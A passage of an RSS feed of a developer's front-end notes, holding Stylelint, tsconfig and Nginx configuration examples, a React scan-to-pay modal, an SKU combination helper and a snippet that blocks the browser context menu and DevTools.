    <span>'^@/utils(.*)$'</span><span>,</span>
    <span>'^@/(.*)$'</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Stylelint</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/Stylelint/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/Stylelint/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Stylelint</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-stylelintrc-js"> 1. .stylelintrc.js</h2>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>extends</span><span>:</span> <span>[</span>
    <span>'stylelint-config-standard'</span><span>,</span>
    <span>'stylelint-config-prettier'</span><span>,</span>
    <span>'stylelint-config-css-modules'</span><span>,</span>
    <span>'stylelint-config-recess-order'</span><span>,</span>
  <span>]</span><span>,</span>
  <span>plugins</span><span>:</span> <span>[</span><span>'stylelint-declaration-block-no-ignored-properties'</span><span>]</span><span>,</span>
  <span>rules</span><span>:</span> <span>{</span>
    <span>'plugin/declaration-block-no-ignored-properties'</span><span>:</span> <span>true</span><span>,</span>
    <span>'function-url-quotes'</span><span>:</span> <span>'always'</span><span>,</span>
    <span>'selector-type-no-unknown'</span><span>:</span> <span>null</span><span>,</span>
    <span>'no-descending-specificity'</span><span>:</span> <span>null</span><span>,</span>
    <span>'selector-attribute-quotes'</span><span>:</span> <span>'always'</span><span>,</span>
    <span>'font-family-no-missing-generic-family-keyword'</span><span>:</span> <span>null</span><span>,</span>
    <span>'value-keyword-case'</span><span>:</span> <span>[</span><span>'lower'</span><span>,</span> <span>{</span> <span>ignoreKeywords</span><span>:</span> <span>[</span><span>'composes'</span><span>]</span> <span>}</span><span>]</span><span>,</span>
    <span>'selector-class-pattern'</span><span>:</span> <span>[</span>
      <span>'^([a-z][a-z0-9]*(-[a-z0-9]+)*)$'</span><span>,</span>
      <span>{</span> <span>message</span><span>:</span> <span>'Expected class selector to be kebab-case'</span> <span>}</span><span>,</span>
    <span>]</span><span>,</span>
    <span>'unit-no-unknown'</span><span>:</span> <span>[</span><span>true</span><span>,</span> <span>{</span> <span>ignoreUnits</span><span>:</span> <span>[</span><span>'rpx'</span><span>]</span> <span>}</span><span>]</span><span>,</span>
    <span>'at-rule-no-unknown'</span><span>:</span> <span>[</span>
      <span>true</span><span>,</span>
      <span>{</span>
        <span>ignoreAtRules</span><span>:</span> <span>[</span>
          <span>'content'</span><span>,</span>
          <span>'each'</span><span>,</span>
          <span>'error'</span><span>,</span>
          <span>'extend'</span><span>,</span>
          <span>'for'</span><span>,</span>
          <span>'function'</span><span>,</span>
          <span>'if'</span><span>,</span>
          <span>'include'</span><span>,</span>
          <span>'mixin'</span><span>,</span>
          <span>'return'</span><span>,</span>
          <span>'while'</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>
  <span>customSyntax</span><span>:</span> <span>'postcss-scss'</span><span>,</span>
  <span>overrides</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>files</span><span>:</span> <span>[</span><span>'**/*.js'</span><span>,</span> <span>'**/*.jsx'</span><span>,</span> <span>'**/*.ts'</span><span>,</span> <span>'**/*.tsx'</span><span>]</span><span>,</span>
      <span>customSyntax</span><span>:</span> <span>'@stylelint/postcss-css-in-js'</span><span>,</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>customSyntax</span><span>:</span> <span>'postcss-scss'</span><span>,</span>
      <span>files</span><span>:</span> <span>[</span><span>'**/*.css'</span><span>,</span> <span>'**/*.scss'</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>customSyntax</span><span>:</span> <span>'postcss-less'</span><span>,</span>
      <span>files</span><span>:</span> <span>[</span><span>'**/*.less'</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
    <span>{</span>
      <span>customSyntax</span><span>:</span> <span>'postcss-html'</span><span>,</span>
      <span>files</span><span>:</span> <span>[</span><span>'**/*.html'</span><span>,</span> <span>'**/*.vue'</span><span>]</span><span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>TsConfig</title>
      <link>https://www.matrixtheone.ga/web/note/Lint/TS-Config/</link>
      <guid>https://www.matrixtheone.ga/web/note/Lint/TS-Config/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">TsConfig</source>
      <category>Lint</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-tsconfig-json"> 1. tsconfig.json</h2>
<div><pre><code><span>{</span>
  <span>"compilerOptions"</span><span>:</span> <span>{</span>
    <span>"incremental"</span><span>:</span> <span>true</span><span>,</span>
    <span>"baseUrl"</span><span>:</span> <span>"."</span><span>,</span>
    <span>"outDir"</span><span>:</span> <span>"dist"</span><span>,</span>
    <span>"allowJs"</span><span>:</span> <span>true</span><span>,</span>
    <span>"sourceMap"</span><span>:</span> <span>true</span><span>,</span>
    <span>"target"</span><span>:</span> <span>"esnext"</span><span>,</span>
    <span>"module"</span><span>:</span> <span>"esnext"</span><span>,</span>
    <span>"moduleResolution"</span><span>:</span> <span>"node"</span><span>,</span>

    <span>"jsx"</span><span>:</span> <span>"react"</span><span>,</span>
    <span>"lib"</span><span>:</span> <span>[</span><span>"esnext"</span><span>,</span> <span>"dom"</span><span>]</span><span>,</span>
    <span>"skipLibCheck"</span><span>:</span> <span>true</span><span>,</span>

    <span>"strict"</span><span>:</span> <span>true</span><span>,</span>
    <span>"noImplicitAny"</span><span>:</span> <span>false</span><span>,</span>
    <span>"noImplicitThis"</span><span>:</span> <span>false</span><span>,</span>
    <span>"noUnusedLocals"</span><span>:</span> <span>true</span><span>,</span>
    <span>"noImplicitReturns"</span><span>:</span> <span>true</span><span>,</span>
    <span>"noFallthroughCasesInSwitch"</span><span>:</span> <span>true</span><span>,</span>

    <span>"esModuleInterop"</span><span>:</span> <span>true</span><span>,</span>
    <span>"resolveJsonModule"</span><span>:</span> <span>true</span><span>,</span>
    <span>"experimentalDecorators"</span><span>:</span> <span>true</span><span>,</span>
    <span>"allowSyntheticDefaultImports"</span><span>:</span> <span>true</span><span>,</span>
    <span>"suppressImplicitAnyIndexErrors"</span><span>:</span> <span>true</span><span>,</span>
    <span>"forceConsistentCasingInFileNames"</span><span>:</span> <span>true</span><span>,</span>

    <span>"paths"</span><span>:</span> <span>{</span>
      <span>"@/*"</span><span>:</span> <span>[</span><span>"src/*"</span><span>]</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>"include"</span><span>:</span> <span>[</span><span>"src"</span><span>,</span> <span>"mock"</span><span>,</span> <span>"test"</span><span>,</span> <span>"typings"</span><span>,</span> <span>"config"</span><span>]</span><span>,</span>
  <span>"exclude"</span><span>:</span> <span>[</span><span>"node_modules"</span><span>,</span> <span>"build"</span><span>,</span> <span>"dist"</span><span>,</span> <span>"scripts"</span><span>,</span> <span>"webpack"</span><span>,</span> <span>"jest"</span><span>]</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Next</title>
      <link>https://www.matrixtheone.ga/web/note/Next/</link>
      <guid>https://www.matrixtheone.ga/web/note/Next/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Next</source>
      <category>Next</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>Nginx</title>
      <link>https://www.matrixtheone.ga/web/note/Nginx/</link>
      <guid>https://www.matrixtheone.ga/web/note/Nginx/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Nginx</source>
      <category>Nginx</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-http-缓存"> 1. HTTP 缓存</h2>
<div><pre><code><span><span>server</span></span> <span>{</span>
  <span># 不缓存html</span>
  <span><span>location</span> ~ .*\.(html)$</span> <span>{</span>
    <span><span>add_header</span> Cache-Control <span>"public, no-cache"</span></span><span>;</span>
  <span>}</span>

  <span># 媒体资源资源缓存一年</span>
  <span><span>location</span> ~ .*\.(jpe?g|png|svg|gif|webp|bmp|ico|cur|heic|tiff?|mp3|m4a|aac|ogg|midi?|wav|mp4|mov|webm|mpe?g|avi|ogv|flv|wmv)$</span> <span>{</span>
    <span><span>add_header</span> Cache-Control <span>"public, max-age=31536000"</span></span><span>;</span>
  <span>}</span>

  <span># 字体资源缓存一年</span>
  <span><span>location</span> ~ .*\.(woff2?|ttf|ttc|otf|eot|svgz?)$</span> <span>{</span>
    <span><span>add_header</span> Cache-Control <span>"public, max-age=31536000"</span></span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><h2 id="_2-gzip-配置"> 2. gzip 配置</h2>
<div><pre><code><span><span>server</span></span> <span>{</span>
  <span><span>gzip</span> <span>on</span></span><span>;</span>
  <span><span>gzip_static</span> <span>on</span></span><span>;</span>
  <span><span>gzip_comp_level</span> <span>4</span></span><span>;</span>
  <span><span>gzip_min_length</span> <span>1k</span></span><span>;</span>
  <span><span>gzip_buffers</span> <span>4</span> <span>32k</span></span><span>;</span>
  <span><span>gzip_types</span> text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript application/javascript</span><span>;</span>
  <span><span>gzip_disable</span> <span>"MSIE [1-6]\."</span></span><span>;</span>
  <span><span>gzip_vary</span> <span>on</span></span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_3-browserhistory-路由配置"> 3. browserHistory 路由配置</h2>
<div><pre><code><span><span>server</span></span> <span>{</span>
  <span><span>location</span> /</span> <span>{</span>
    <span><span>try_files</span> <span>$uri</span> <span>$uri</span>/ /index.html</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_4-https-配置"> 4. HTTPS 配置</h2>
<ul>
<li>需要先安装 SSL 模块</li>
</ul>
<div><pre><code><span><span>server</span></span> <span>{</span>
  <span><span>listen</span> <span>443</span> ssl</span><span>;</span>
  <span><span>server_name</span> matrixtheone.ga www.matrixtheone.ga</span><span>;</span>

  <span><span>ssl_certificate</span> cert/matrixtheone.ga.pem</span><span>;</span>
  <span><span>ssl_certificate_key</span> cert/matrixtheone.ga.key</span><span>;</span>

  <span><span>ssl_session_timeout</span> <span>5m</span></span><span>;</span>
  <span><span>ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4</span><span>;</span>
  <span><span>ssl_protocols</span> TLSv1 TLSv1.1 TLSv1.2</span><span>;</span>
  <span><span>ssl_prefer_server_ciphers</span> <span>on</span></span><span>;</span>

  <span><span>location</span> /</span> <span>{</span>
    <span><span>root</span> html</span><span>;</span>
    <span><span>index</span> index.html index.htm</span><span>;</span>
  <span>}</span>
<span>}</span>

<span><span>server</span></span> <span>{</span>
  <span><span>listen</span> <span>80</span></span><span>;</span>
  <span><span>server_name</span> matrixtheone.ga www.matrixtheone.ga</span><span>;</span>
  <span><span>return</span> <span>301</span> https://<span>$server_name</span><span>$request_uri</span></span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_5-利用-nginx-反向代理解决跨域问题"> 5. 利用 Nginx 反向代理解决跨域问题</h2>
<div><pre><code><span><span>server</span></span> <span>{</span>
  <span><span>listen</span> <span>4396</span></span><span>;</span> <span># 端口</span>
  <span><span>server_name</span> localhost</span><span>;</span> <span># 服务名</span>

  <span><span>location</span> /</span> <span>{</span>
    <span><span>proxy_pass</span> http://localhost:3000/</span><span>;</span> <span># 前端页面</span>
  <span>}</span>

  <span><span>location</span> ^~/agency/</span> <span>{</span>
    <span><span>proxy_pass</span> http://www.coderljw.ga:5000/</span><span>;</span> <span># 后端接口</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><p>通过 `http://localhost:4396/` 打开页面 :::</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Node</title>
      <link>https://www.matrixtheone.ga/web/note/Node/</link>
      <guid>https://www.matrixtheone.ga/web/note/Node/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Node</source>
      <category>Node</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>Nuxt</title>
      <link>https://www.matrixtheone.ga/web/note/Nuxt/</link>
      <guid>https://www.matrixtheone.ga/web/note/Nuxt/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Nuxt</source>
      <category>Nuxt</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>项目笔记</title>
      <link>https://www.matrixtheone.ga/web/note/README%20copy/</link>
      <guid>https://www.matrixtheone.ga/web/note/README%20copy/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">项目笔记</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/水浒传.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>前端笔记</title>
      <link>https://www.matrixtheone.ga/web/note/</link>
      <guid>https://www.matrixtheone.ga/web/note/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">前端笔记</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/头文字D.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>业务</title>
      <link>https://www.matrixtheone.ga/web/note/React/Business/</link>
      <guid>https://www.matrixtheone.ga/web/note/React/Business/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">业务</source>
      <category>React</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-扫码盒微信-支付宝支付"> 1. 扫码盒微信/支付宝支付</h2>
<div><pre><code><span>import</span> React<span>,</span> <span>{</span> useEffect<span>,</span> useRef<span>,</span> useState <span>}</span> <span>from</span> <span>'react'</span>
<span>import</span> <span>{</span> Input<span>,</span> message<span>,</span> Modal <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>type</span> <span>{</span> InputRef <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> <span>{</span> useRequest <span>}</span> <span>from</span> <span>'ahooks'</span>
<span>import</span> <span>{</span> OrderPay <span>}</span> <span>from</span> <span>'@/services/OrderService'</span>
<span>import</span> styles <span>from</span> <span>'./index.less'</span>

<span>type</span> <span>ScanPayProps</span> <span>=</span> <span>{</span>
  visible<span>:</span> <span>true</span>
  <span>hidden</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>void</span>
  <span>refresh</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>void</span>
  currentRow<span>:</span> <span>API</span><span>.</span>Order
<span>}</span>

<span>const</span> ScanPay<span>:</span> React<span>.</span><span>FC</span><span>&lt;</span>ScanPayProps<span>></span> <span>=</span> <span>(</span><span>{</span>
  visible<span>,</span>
  hidden<span>,</span>
  refresh<span>,</span>
  currentRow<span>,</span>
<span>}</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> inputRef <span>=</span> <span><span>useRef</span><span><span>&lt;</span>InputRef<span>></span></span></span><span>(</span><span>null</span><span>)</span>
  <span>const</span> <span>[</span>payOrderCode<span>,</span> setPayOrderCode<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>''</span><span>)</span>
  <span>const</span> <span>[</span>timestamp<span>,</span> setTimestamp<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>0</span><span>)</span>
  <span>const</span> timer <span>=</span> <span><span>useRef</span><span><span>&lt;</span>NodeJS<span>.</span>Timer<span>></span></span></span><span>(</span><span>)</span>

  <span>const</span> <span>{</span> run<span>:</span> pay<span>,</span> loading<span>:</span> payLoading <span>}</span> <span>=</span> <span>useRequest</span><span>(</span>OrderPay<span>,</span> <span>{</span>
    manual<span>:</span> <span>true</span><span>,</span>
    <span>onSuccess</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      message<span>.</span><span>success</span><span>(</span><span>'支付成功'</span><span>)</span>
      <span>hidden</span><span>(</span><span>)</span>
      <span>refresh</span><span>(</span><span>)</span>
    <span>}</span><span>,</span>
    <span>onFinally</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      message<span>.</span><span>destroy</span><span>(</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span><span>)</span>

  <span>const</span> <span>{</span> orderId<span>,</span> orderNo<span>,</span> actualAmount <span>}</span> <span>=</span> currentRow <span>||</span> <span>{</span><span>}</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> inputRef<span>?.</span>current<span>?.</span><span>focus</span><span>(</span><span>)</span><span>,</span> <span>300</span><span>)</span>
  <span>}</span><span>,</span> <span>[</span><span>]</span><span>)</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>clearInterval</span><span>(</span>timer<span>.</span>current<span>)</span>
    timer<span>.</span>current <span>=</span> <span>setInterval</span><span>(</span><span>async</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>timestamp <span>&amp;&amp;</span> <span>+</span><span>new</span> <span>Date</span><span>(</span><span>)</span> <span>-</span> timestamp <span>></span> <span>500</span> <span>&amp;&amp;</span> payOrderCode<span>)</span> <span>{</span>
        <span>clearInterval</span><span>(</span>timer<span>.</span>current<span>)</span>
        message<span>.</span><span>loading</span><span>(</span><span>'提交中'</span><span>,</span> <span>0</span><span>)</span>
        <span>await</span> <span>pay</span><span>(</span><span>{</span> orderId<span>,</span> payCode<span>:</span> payOrderCode <span>}</span><span>)</span>
      <span>}</span>
    <span>}</span><span>,</span> <span>500</span><span>)</span>
    <span>return</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>clearInterval</span><span>(</span>timer<span>.</span>current<span>)</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>timestamp<span>]</span><span>)</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span><span>Modal</span></span>
      <span>title</span><span><span>=</span><span>{</span><span><span>`</span><span><span>${</span>orderNo<span>}</span></span><span>（支付金额：</span><span><span>${</span>actualAmount<span>}</span></span><span>）</span><span>`</span></span><span>}</span></span>
      <span>visible</span><span><span>=</span><span>{</span>visible<span>}</span></span>
      <span>maskClosable</span><span><span>=</span><span>{</span><span>false</span><span>}</span></span>
      <span>footer</span><span><span>=</span><span>{</span><span>null</span><span>}</span></span>
      <span>onCancel</span><span><span>=</span><span>{</span>hidden<span>}</span></span>
      <span>destroyOnClose</span>
      <span>width</span><span><span>=</span><span>{</span><span>600</span><span>}</span></span>
    <span>></span></span><span>
      </span><span><span><span>&lt;</span><span>Input</span></span>
        <span>ref</span><span><span>=</span><span>{</span>inputRef<span>}</span></span>
        <span>value</span><span><span>=</span><span>{</span>payOrderCode<span>}</span></span>
        <span>onBlur</span><span><span>=</span><span>{</span>_ <span>=></span> inputRef<span>.</span>current<span>?.</span>focus<span>?.</span><span>(</span><span>)</span><span>}</span></span>
        <span>onChange</span><span><span>=</span><span>{</span><span>(</span><span>{</span> target <span>}</span><span>)</span> <span>=></span> <span>{</span>
          <span>if</span> <span>(</span>payLoading<span>)</span> <span>return</span>
          <span>setTimestamp</span><span>(</span><span>+</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span>
          <span>// 扫码机30ms内延迟</span>
          <span>if</span> <span>(</span>timestamp <span>&amp;&amp;</span> <span>+</span><span>new</span> <span>Date</span><span>(</span><span>)</span> <span>-</span> timestamp <span>></span> <span>30</span> <span>&amp;&amp;</span> payOrderCode<span>)</span> <span>{</span>
            <span>setPayOrderCode</span><span>(</span>target<span>.</span>value<span>.</span><span>slice</span><span>(</span><span>-</span><span>1</span><span>)</span><span>)</span>
          <span>}</span> <span>else</span> <span>{</span>
            <span>setPayOrderCode</span><span>(</span>target<span>.</span>value<span>)</span>
          <span>}</span>
        <span>}</span><span>}</span></span>
        <span>className</span><span><span>=</span><span>{</span>styles<span>[</span><span>'pay-input'</span><span>]</span><span>}</span></span>
      <span>/></span></span><span>
      </span><span><span><span>&lt;</span>div</span> <span>style</span><span><span>=</span><span>{</span><span>{</span> display<span>:</span> <span>'flex'</span><span>,</span> justifyContent<span>:</span> <span>'center'</span> <span>}</span><span>}</span></span><span>></span></span><span>
        </span><span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>{</span>styles<span>[</span><span>'qr-scanner'</span><span>]</span><span>}</span></span><span>></span></span><span>
          </span><span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>{</span>styles<span>.</span>box<span>}</span></span><span>></span></span><span>
            </span><span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>{</span>styles<span>.</span>line<span>}</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span><span>
            </span><span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>{</span>styles<span>.</span>angle<span>}</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span><span>
          </span><span><span><span>&lt;/</span>div</span><span>></span></span><span>
        </span><span><span><span>&lt;/</span>div</span><span>></span></span><span>
      </span><span><span><span>&lt;/</span>div</span><span>></span></span><span>
    </span><span><span><span>&lt;/</span><span>Modal</span></span><span>></span></span>
  <span>)</span>
<span>}</span>

<span>export</span> <span>default</span> ScanPay
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br></div></div>
<h2 id="_2-sku-排列组合"> 2. SKU 排列组合</h2>
<div><pre><code><span>const</span> <span>combine</span> <span>=</span> <span>(</span><span><span>...</span>chunks</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> result <span>=</span> <span>[</span><span>]</span><span>,</span>
    chunkQuantity <span>=</span> chunks<span>.</span>length

  <span>function</span> <span>recursion</span><span>(</span><span>chunkIndex<span>,</span> prev</span><span>)</span> <span>{</span>
    <span>const</span> chunk <span>=</span> chunks<span>[</span>chunkIndex<span>]</span><span>,</span>
      isLast <span>=</span> chunkIndex <span>===</span> chunkQuantity <span>-</span> <span>1</span>

    chunk<span>.</span><span>forEach</span><span>(</span><span>i</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>isLast<span>)</span> <span>return</span> result<span>.</span><span>push</span><span>(</span><span>[</span><span>...</span>prev<span>,</span> i<span>]</span><span>)</span>
      <span>return</span> <span>recursion</span><span>(</span>chunkIndex <span>+</span> <span>1</span><span>,</span> <span>[</span><span>...</span>prev<span>,</span> i<span>]</span><span>)</span>
    <span>}</span><span>)</span>
  <span>}</span>

  <span>recursion</span><span>(</span><span>0</span><span>,</span> <span>[</span><span>]</span><span>)</span>
  <span>return</span> result
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><h2 id="_3-禁止打开-devtools"> 3. 禁止打开 DevTools</h2>
<div><pre><code><span>import</span> devtools <span>from</span> <span>'devtools-detect'</span>

<span>// 禁止右键菜单</span>
window<span>.</span><span>oncontextmenu</span> <span>=</span> _ <span>=></span> <span>false</span>

<span>// 禁止打开DevTools</span>
document<span>.</span><span>onkeydown</span> <span>=</span> event <span>=></span> <span>{</span>
  <span>const</span> <span>{</span> keyCode<span>,</span> ctrlKey<span>,</span> shiftKey <span>}</span> <span>=</span> event

  <span>if</span> <span>(</span>keyCode <span>===</span> <span>123</span> <span>||</span> <span>(</span>ctrlKey <span>&amp;&amp;</span> shiftKey <span>&amp;&amp;</span> keyCode <span>===</span> <span>73</span><span>)</span><span>)</span> <span>{</span>
    <span>return</span> <span>false</span>
  <span>}</span>
<span>}</span>

<span>/**
 * 监听打开DevTools，跳转about:blank（空白页）
 * Bug：根据可视宽高判断，如果改为手机模式是区分不了的
 * Tips：window.close() 只能关闭通过JS打开的窗口
 */</span>
<span>if</span> <span>(</span>devtools<span>.</span>isOpen<span>)</span> window<span>.</span>location<span>.</span>href <span>=</span> <span>'about:blank'</span>

window<span>.</span><span>addEventListener</span><span>(</span><span>'devtoolschange'</span><span>,</span> event <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>event<span>.</span>detail<span>.</span>isOpen<span>)</span> window<span>.</span>location<span>.</span>href <span>=</span> <span>'about:blank'</span>
<span>}</span><span>)</span>
</code></pre>
